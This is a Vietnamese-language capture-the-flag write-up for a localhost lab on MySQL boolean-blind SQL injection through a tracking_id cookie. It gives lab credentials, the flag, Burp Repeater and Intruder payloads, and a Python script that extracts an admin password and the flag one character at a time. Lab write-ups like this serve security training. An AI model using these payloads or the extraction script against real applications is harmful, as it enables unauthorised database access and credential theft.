# SQLi-025: MySQL Boolean Blind via Cookie - Writeup

## Flag: `FLAG{c00k13_1nj3ct10n_bl1nd}`

---

## 🔑 Bước 0: LOGIN & GET COOKIE

### Cách 1: Login qua Browser (Khuyến nghị)

1. Mở browser và truy cập: `http://localhost:5025/login`
2. Đăng nhập với credentials:
   - **Username:** `cookie_admin`
   - **Password:** `C00k13_Adm1n_P@ss!`
3. Cookie sẽ **tự động được lưu vào browser**
4. Click "Back to Dashboard" để xác nhận cookie hoạt động

### Cách 2: Sử dụng Cookie mặc định

Bạn có thể dùng cookie có sẵn trong database: `abc123xyz`

---

## 🔍 Bước 1: DETECT - Phát hiện SQLi

### Setup Burp Suite

1. **Bật Burp Suite Proxy:**
   - Proxy → Intercept → Intercept is on
   - Configure browser để sử dụng proxy `127.0.0.1:8080`

2. **Truy cập trang chủ:**
   - Mở browser, truy cập `http://localhost:5025/`
   - Burp sẽ intercept request

3. **Gửi request đến Repeater:**
   - Click chuột phải → Send to Repeater (hoặc `Ctrl+R`)

### Test SQLi trong Repeater

**Request gốc:**
```http
GET / HTTP/1.1
Host: localhost:5025
Cookie: tracking_id=abc123xyz
```

**Test TRUE condition:**
```http
GET / HTTP/1.1
Host: localhost:5025
Cookie: tracking_id=abc123xyz' AND '1'='1
```
→ Response: `Welcome back!` ✅

**Test FALSE condition:**
```http
GET / HTTP/1.1
Host: localhost:5025
Cookie: tracking_id=abc123xyz' AND '1'='2
```
→ Response: `Welcome, new visitor!` ✅

**Kết luận:** Boolean Blind SQLi confirmed!

---

## 🎯 Bước 2: IDENTIFY - Xác định DBMS

Trong Burp Repeater, test các payload sau:

**MySQL version check:**
```http
Cookie: tracking_id=abc123xyz' AND @@version LIKE '8%'-- -
```
→ Response: `Welcome back!` → MySQL 8.x confirmed ✅

**Alternative check:**
```http
Cookie: tracking_id=abc123xyz' AND LENGTH(DATABASE())>0-- -
```
→ Response: `Welcome back!` → MySQL confirmed ✅

---

## 🔢 Bước 3: ENUMERATE - Liệt kê thông tin

### 3.1. Kiểm tra bảng tồn tại

**Check bảng `admin_users`:**
```http
Cookie: tracking_id=abc123xyz' AND (SELECT COUNT(*) FROM admin_users)>0-- -
```
→ `Welcome back!` → Bảng tồn tại ✅

**Check bảng `flags`:**
```http
Cookie: tracking_id=abc123xyz' AND (SELECT COUNT(*) FROM flags)>0-- -
```
→ `Welcome back!` → Bảng tồn tại ✅

### 3.2. Đếm số records

**Số lượng admin users:**
```http
Cookie: tracking_id=abc123xyz' AND (SELECT COUNT(*) FROM admin_users)=2-- -
```
→ `Welcome back!` → Có 2 admin users ✅

### 3.3. Xác định độ dài dữ liệu

**Độ dài password:**
```http
Cookie: tracking_id=abc123xyz' AND LENGTH((SELECT password FROM admin_users LIMIT 1))=20-- -
```
→ `Welcome back!` → Password có 20 ký tự ✅

**Độ dài flag:**
```http
Cookie: tracking_id=abc123xyz' AND LENGTH((SELECT value FROM flags LIMIT 1))=28-- -
```
→ `Welcome back!` → Flag có 28 ký tự ✅

---

## 📤 Bước 4: EXTRACT - Trích xuất dữ liệu

### 4.1. Extract Password (Manual)

Sử dụng Burp Repeater để extract từng ký tự:

**Ký tự đầu tiên (position 1):**
```http
Cookie: tracking_id=abc123xyz' AND SUBSTRING((SELECT password FROM admin_users LIMIT 1),1,1)='C'-- -
```
→ `Welcome back!` → Ký tự đầu là 'C' ✅

**Ký tự thứ 2:**
```http
Cookie: tracking_id=abc123xyz' AND SUBSTRING((SELECT password FROM admin_users LIMIT 1),2,1)='0'-- -
```
→ `Welcome back!` → Ký tự thứ 2 là '0' ✅

**Tiếp tục cho đến hết...**

**Password đầy đủ:** `C00k13_Adm1n_P@ss!`

### 4.2. Extract Password (Burp Intruder - Tự động)

1. **Gửi request đến Intruder:**
   - Trong Repeater, click chuột phải → Send to Intruder

2. **Configure Positions:**
   ```http
   Cookie: tracking_id=abc123xyz' AND SUBSTRING((SELECT password FROM admin_users LIMIT 1),1,1)='§a§'-- -
   ```
   - Clear tất cả positions (`Clear §`)
   - Highlight ký tự 'a' → Add §

3. **Configure Payloads:**
   - Payload type: Simple list
   - Add characters: `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$_`

4. **Start Attack:**
   - Click "Start attack"
   - Tìm response có "Welcome back" → Đó là ký tự đúng

5. **Lặp lại cho từng position:**
   - Position 2: `SUBSTRING(...,2,1)='§a§'`
   - Position 3: `SUBSTRING(...,3,1)='§a§'`
   - ...

---

## 🏆 Bước 5: EXFILTRATE FLAG

### Cách 1: Manual với Burp Repeater

**Extract từng ký tự của flag:**

```http
Cookie: tracking_id=abc123xyz' AND SUBSTRING((SELECT value FROM flags LIMIT 1),1,1)='F'-- -
```
→ `Welcome back!` → Ký tự 1: 'F' ✅

```http
Cookie: tracking_id=abc123xyz' AND SUBSTRING((SELECT value FROM flags LIMIT 1),2,1)='L'-- -
```
→ `Welcome back!` → Ký tự 2: 'L' ✅

Tiếp tục cho đến position 28...

### Cách 2: Burp Intruder (Nhanh hơn)

**Setup Cluster Bomb Attack:**

1. **Positions:**
   ```http
   Cookie: tracking_id=abc123xyz' AND SUBSTRING((SELECT value FROM flags LIMIT 1),§1§,1)='§a§'-- -
   ```

2. **Payload Set 1 (Position):**
   - Type: Numbers
   - From: 1, To: 28, Step: 1

3. **Payload Set 2 (Character):**
   - Type: Simple list
   - Add: `FLAG{}_0123456789abcdefghijklmnopqrstuvwxyz`

4. **Start Attack:**
   - Sort by position
   - Tìm responses có "Welcome back"

### Cách 3: Python Script (Tự động hoàn toàn)

```python
import requests

def check(cookie):
    r = requests.get("http://localhost:5025/", cookies={"tracking_id": cookie})
    return "Welcome back" in r.text

flag = ""
for pos in range(1, 29):
    for c in "FLAG{}_0123456789abcdefghijklmnopqrstuvwxyz":
        cookie = f"abc123xyz' AND SUBSTRING((SELECT value FROM flags LIMIT 1),{pos},1)='{c}'-- -"
        if check(cookie):
            flag += c
            print(f"[+] Position {pos}: {flag}")
            break

print(f"\n🎉 FLAG: {flag}")
```

---

## 🎉 Final Flag

```
FLAG{c00k13_1nj3ct10n_bl1nd}
```

---

## ⚠️ Troubleshooting - Xử lý lỗi thường gặp

### Vấn đề: Payload không hoạt động (luôn trả về "New visitor")

**Triệu chứng:**
```http
Cookie: tracking_id=YOUR_COOKIE'+AND+'1'='1
Cookie: tracking_id=YOUR_COOKIE'+AND+'1'='2
```
Cả hai đều cho kết quả: `Welcome, new visitor!`

**Nguyên nhân:**

1. **Dấu `+` bị hiểu là space:** Trong HTTP, `+` thường được decode thành khoảng trắng, khiến SQL query bị sai cú pháp.

2. **Quote không đóng đúng:** SQL query có thể bị syntax error do dấu `'` thừa.

**Giải pháp:**

✅ **ĐÚNG - Sử dụng space thay vì `+`:**
```http
Cookie: tracking_id=YOUR_COOKIE' AND '1'='1
```

✅ **TỐT HƠN - Thêm comment để đóng query:**
```http
Cookie: tracking_id=YOUR_COOKIE' AND '1'='1'-- -
```

❌ **SAI - Không dùng `+`:**
```http
Cookie: tracking_id=YOUR_COOKIE'+AND+'1'='1
```

### Kiểm tra trong Burp Suite

**⚠️ QUAN TRỌNG: Tắt URL Encoding**

Burp Suite có thể tự động URL-encode cookie value, khiến payload bị sai. Ví dụ:

❌ **SAI (URL-encoded):**
```http
Cookie: tracking_id=_0t15UDKhFUfMp8qEBGLHQ'%20AND%20'1'%3d'1'--%20-
```
Trong đó: `%20` = space, `%3d` = dấu `=`

✅ **ĐÚNG (Non-encoded):**
```http
Cookie: tracking_id=_0t15UDKhFUfMp8qEBGLHQ' AND '1'='1'-- -
```

**Cách tắt URL encoding trong Burp Repeater:**

1. **Mở Burp Repeater**
2. **Tìm phần "Request"** (phía trên cùng)
3. **Nhìn xuống dưới request body**, tìm dòng chữ nhỏ:
   - `☐ Update Content-Length`
   - `☐ Unpack gzip / deflate`
   - `☐ Follow redirections`
   - `☐ Process cookies in redirections`
   - **`☐ URL-encode these characters`** ← TÌM DÒNG NÀY!

4. **UNCHECK (bỏ tick)** checkbox `URL-encode these characters`

5. **Gõ lại payload** trực tiếp trong Cookie header:
   ```http
   Cookie: tracking_id=YOUR_COOKIE' AND '1'='1
   ```

6. **Click "Send"** để test

**Kiểm tra kỹ:**
- Nhấn vào tab **"Raw"** để xem request thực tế
- Đảm bảo KHÔNG có `%20`, `%3d`, hay ký tự encoded nào khác
- Cookie value phải là plain text


### Test nhanh

**Payload cơ bản (không cần comment):**
```http
Cookie: tracking_id=abc123xyz' AND '1'='1
```

**Payload an toàn (có comment):**
```http
Cookie: tracking_id=abc123xyz' AND '1'='1'-- -
```

**SQL Query được tạo ra:**
```sql
-- Payload không comment:
SELECT page_views FROM tracking WHERE tracking_id = 'abc123xyz' AND '1'='1'

-- Payload có comment:
SELECT page_views FROM tracking WHERE tracking_id = 'abc123xyz' AND '1'='1'-- -'
```

---

## 📝 Summary

### Burp Suite Workflow:

1. **Proxy** → Intercept request
2. **Repeater** → Test SQLi manually
3. **Intruder** → Automate character extraction
4. **Decoder** → Decode/encode if needed

### Key Payloads:

| Purpose | Payload |
|---------|---------|
| Detect | `' AND '1'='1` |
| Identify DBMS | `' AND @@version LIKE '8%'-- -` |
| Check table | `' AND (SELECT COUNT(*) FROM table)>0-- -` |
| Get length | `' AND LENGTH((SELECT col FROM table))=X-- -` |
| Extract char | `' AND SUBSTRING((SELECT col FROM table),POS,1)='C'-- -` |

### Tips:

- Luôn dùng `-- -` để comment phần còn lại của query
- Sử dụng Burp Repeater để test nhanh
- Sử dụng Burp Intruder để automate extraction
- Kiểm tra response length/content để phân biệt TRUE/FALSE
